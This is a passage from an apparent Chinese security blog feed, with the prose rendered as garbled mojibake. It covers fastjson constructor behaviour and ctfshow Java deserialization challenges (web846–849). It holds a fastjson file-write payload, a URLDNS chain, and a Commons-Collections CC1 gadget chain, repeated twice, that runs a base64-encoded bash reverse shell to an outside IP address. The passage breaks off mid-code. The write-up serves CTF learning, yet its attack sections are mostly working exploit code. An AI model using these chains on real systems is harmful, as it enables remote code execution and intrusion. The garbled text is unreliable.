å‡½æ•°æ•°ç»„ï¼Œæˆ‘ä»¬ç»§ç»­å‘ä¸Šåˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410162507466.png" alt="image-20240410162507466"></p><p>å°±åœ¨ä¸Šæ–¹ï¼ŒåŸºæœ¬å¯ä»¥ç¡®è®¤ä¸ºæ„é€ å‡½æ•°æ•°ç»„ï¼Œç»§ç»­è·Ÿè¸ª</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410162558949.png" alt="image-20240410162558949"></p><p>å¯ä»¥å‘ç°åœ¨289è¡Œï¼Œåˆ©ç”¨getDeclaredConstructors()è·å–äº†clazzçš„æ‰€æœ‰æ„é€ å‡½æ•°ï¼Œè¿™é‡Œçš„clazzå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ç±»ï¼Œä½†è¿™é‡Œå°±å‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯getDeclaredConstructorsè¿™ä¸ªå‡½æ•°çš„è·å–éšæœºæ€§ï¼Œè¿™é‡Œä»…ä»…æ˜¯æˆ‘ä¸ªäººçš„è§è§£ï¼Œæš‚æ—¶å¹¶æ²¡æœ‰å»æ‰¾å…¶ä»–æ–‡ç« ä½œä¸ºç†è®ºæ”¯æ’‘ï¼Œæˆ‘ä»¬ç”¨ä¸‹é¢çš„ä»£ç è¿›è¡Œæµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.WriterOutputStream\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;file\&quot;:\&quot;/tmp/pwned\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;charset\&quot;:\&quot;UTF-8\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;append\&quot;: false&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>);</span><br><span class="line">        Constructor[] constructor = c.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; constructor.length; i++) &#123;</span><br><span class="line">            System.out.println(constructor[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¹‹åç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410163311035.png" alt="image-20240410163311035"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410163326104.png" alt="image-20240410163326104"></p><p>å‘ç°å‡ºç°äº†ä¸¤ç§è¿è¡Œç»“æœï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿç®€å•è¯´ä¸‹æµ‹è¯•ä»£ç ï¼Œåˆ©ç”¨åå°„è·å–äº†å…¶æ‰€æœ‰æ„é€ å‡½æ•°ï¼Œç„¶åå¾ªç¯è¾“å‡ºã€‚</p><p>æˆ‘ä»¬è§‚å¯Ÿæ§åˆ¶å°çš„è¾“å‡ºç»“æœï¼Œä¸éš¾å‘ç°è¾“å‡ºçš„é¡ºåºç«Ÿç„¶æœ‰æ‰€ä¸åŒï¼Œè¿™å°±æ˜¯æˆ‘æ‰€è¯´çš„è°ƒç”¨çš„éšæœºæ€§ï¼Œæˆ‘ä»¬å†å›åˆ°ä¸Šé¢æ‰€è¯´çš„å¯¹äºå‚æ•°æ•°é‡çš„åˆ¤æ–­éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lookupParameterNames != <span class="literal">null</span> &amp;&amp; lookupParameterNames.length != <span class="number">0</span> &amp;&amp; (creatorConstructor == <span class="literal">null</span> || paramNames == <span class="literal">null</span> || lookupParameterNames.length &gt; paramNames.length)) &#123;</span><br><span class="line">                                            paramNames = lookupParameterNames;</span><br><span class="line">                                            creatorConstructor = constructor;</span><br><span class="line">                                        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„lookupParameterNameså°±æ˜¯æˆ‘ä»¬æ­£åœ¨åˆ¤æ–­çš„æ„é€ å‡½æ•°çš„å‚æ•°ï¼ŒparamNamesæ˜¯å·²ç»å­˜åœ¨çš„æ„é€ å‡½æ•°çš„åˆ¤æ–­ï¼Œç”±æ­¤å¯å¾—ï¼Œå¦‚æœæˆ‘ä»¬ç°åœ¨ä¼ å…¥çš„æ„é€ å‡½æ•°çš„å‚æ•°æ•°é‡å¤§äºå·²çŸ¥çš„æœ€å¤§ï¼ˆåˆå§‹ä¸º0ï¼‰çš„æ„é€ å‡½æ•°çš„å‚æ•°æ•°é‡ï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡Œæ„é€ å‡½æ•°çš„è¦†ç›–ã€‚ç”±äºgetDeclaredConstructorså‡½æ•°è·å–çš„æ„é€ å‚æ•°é¡ºåºä¸åŒï¼Œå‡è®¾å…¶ä¸¤ä¸ªæ„é€ å‡½æ•°ä¸ºc1å’Œc2ï¼Œå¦‚æœè·å–çš„é¡ºåºä¸ºc1åœ¨å‰ï¼Œé‚£ä¹ˆåœ¨c2è¿›å…¥åˆ¤æ–­çš„æ—¶å€™ï¼Œç”±äºå’Œc1çš„å‚æ•°æ•°é‡ç›¸ç­‰ï¼Œæ‰€ä»¥å°±ä¸ä¼šè¿›è¡Œè¦†ç›–æ“ä½œã€‚æ‰€ä»¥ï¼Œå½“å­˜åœ¨å¤šä¸ªå‚æ•°æ•°é‡ç›¸åŒçš„æ„é€ å‡½æ•°æ—¶ï¼Œfjä¼šå§‹ç»ˆè°ƒç”¨æœ€å¼€å§‹ä¼ å…¥çš„é‚£ä¸ªæ„é€ å‡½æ•°ã€‚</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow java ååºåˆ—åŒ–</title>
    <link href="https://bowuchuling.github.io/posts/1837i0op.html"/>
    <id>https://bowuchuling.github.io/posts/1837i0op.html</id>
    <published>2024-04-07T03:08:25.991Z</published>
    <updated>2024-04-07T03:09:04.321Z</updated>
    
    <content type="html"><![CDATA[<h1>java ååºåˆ—åŒ–</h1><h2 id="web846">web846</h2><p>è¯»å–ç”Ÿæˆpayloadçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base64Encoder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// æ›¿æ¢ä¸ºä½ çš„å­—èŠ‚ç æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="comment">//        String filePath = &quot;E:\\æ¼æ´å¤ç°\\cc\\CC1\\target\\classes\\HelloTemplatesImpl.class&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;E:\\æ¼æ´å¤ç°\\cc\\CC1\\ser.bin&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(classBytes);</span><br><span class="line">        System.out.println(encoded);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´å°±æ˜¯æ„é€ é¢˜ç›®åœ°å€çš„dnsæŸ¥è¯¢ï¼Œç”¨dnsurlé‚£æ¡é“¾æ„é€ å°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DNSURL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚ï¼ŒæŠŠurlå¯¹è±¡çš„hashcodeæ”¹æˆä¸æ˜¯-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://4b11f5a3-f961-44ad-aaa7-94e9d56fbf46.challenge.ctf.show&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">123132</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web847">web847</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºInvocationHandler</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å› ä¸ºInvocationHandleræ¥æ”¶çš„æ˜¯maoï¼Œæ‰€ä»¥è¿™é‡Œä»£ç†çš„ç±»å‹ä¹Ÿå¾—æ˜¯mapï¼Œæƒ³è°ƒç”¨hçš„invokeï¼Œå°±åƒä¸‹è¾¹è¿™ä¹ˆå†™å°±è¡Œï¼Œå…·ä½“çš„æˆ‘è¿˜ä¸æ˜¯å¾ˆæ‡‚</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»§ç»­å®ä¾‹åŒ–ä¸€ä¸ªInvocationHandleræ¥æ¥æ”¶map</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web848">web848</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºInvocationHandler</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å› ä¸ºInvocationHandleræ¥æ”¶çš„æ˜¯maoï¼Œæ‰€ä»¥è¿™é‡Œä»£ç†çš„ç±»å‹ä¹Ÿå¾—æ˜¯mapï¼Œæƒ³è°ƒç”¨hçš„invokeï¼Œå°±åƒä¸‹è¾¹è¿™ä¹ˆå†™å°±è¡Œï¼Œå…·ä½“çš„æˆ‘è¿˜ä¸æ˜¯å¾ˆæ‡‚</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»§ç»­å®ä¾‹åŒ–ä¸€ä¸ªInvocationHandleræ¥æ¥æ”¶map</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web849">web849</h2><p>CC4çš„ä¸¤æ¡é“¾å­éƒ½å¯ä»¥ï¼Œæ³¨æ„tpé“¾åŠ è½½çš„æ¶æ„ç±»å¾—ç»§æ‰¿AbstractTranslet</p><figure class="highlight java"><table><tr><td 